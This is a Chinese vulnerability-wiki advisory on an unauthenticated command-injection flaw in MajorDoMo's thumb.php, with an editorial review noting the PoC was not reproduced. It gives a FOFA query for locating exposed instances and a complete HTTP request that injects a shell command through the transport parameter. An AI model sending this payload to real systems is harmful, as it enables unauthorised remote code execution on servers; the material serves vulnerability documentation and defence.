---
cnvd: "CNVD-2024-02175"
source: "wy876 漏洞文库"
id: "vw-35d8c4ae5326a27f96dd7c34"
entity_id: "ve-35d8c4ae5326a27f96dd7c34"
schema_version: "1"
title: "MajorDoMo thumb未授权RCE漏洞(CNVD-2024-02175)"
product: "MajorDoMo"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CNVD-2024-02175"
referenced_identifiers: ""
prerequisites: "称提交0662e5e之前；无认证，RTSP处理及debug"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/MajorDoMo%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/MajorDoMothumb%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E%28CNVD-2024-02175%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nlakvnouzm2wkdy4"
source_status: "recorded"
---

# MajorDoMo thumb未授权RCE漏洞(CNVD-2024-02175)

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：MajorDoMo
- 本文讨论：CNVD-2024-02175 modules/thumb/thumb.php transport
- 版本、权限与配置前提：称提交0662e5e之前；无认证，RTSP处理及debug
- 资料类型：thumb未认证命令注入摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 用&lt;比较Git短哈希不是合法版本顺序，需要提交祖先关系/版本标签
- 无响应/依赖/修复commit链接；不能由接口名推定所有部署可用
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 确切修复提交与命令处理链、平台依赖待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
MajorDoMo是MajorDoMo社区的一个开源DIY 智能家居Q自动化平台。MajorDoMo /modules/thumb/thumb.php接口处存在远程命令执行漏洞，未经身份验证的攻击者可利用此漏洞执行任意指令，获取服务器权限。

# 二、影响版本
+ MajorDoMo< 0662e5e

# 三、资产测绘
+ fofa`app="MajordomoSL"`
+ 特征


# 四、漏洞复现
```http
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nlakvnouzm2wkdy4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
